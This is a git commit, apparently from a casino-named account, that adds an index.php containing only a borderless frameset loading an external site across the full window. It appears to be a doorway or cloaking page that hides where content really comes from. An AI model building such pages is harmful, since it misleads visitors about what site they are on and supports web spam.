8e468fd8dcc1feec32c725ade7defb0e498d45f8
dealerschoicecasinos <167969485+dealerschoicecasinos@users.noreply.github.com>
2024-04-25 11:14:12 +0300

    Create index.php

---
+++ index.php
@@ -0,0 +1,4 @@
+<FRAMESET border=0 rows="100%,*" frameborder="no" marginleft=0 margintop=0 marginright=0 marginbottom=0> 
+<frame src="https://cz78753.tw1.ru/" scrolling=auto frameborder="no" border=0 noresize> 
+<frame topmargin="0" marginwidth=0 scrolling=no marginheight=0 frameborder="no" border=0 noresize> 
+</FRAMESET>
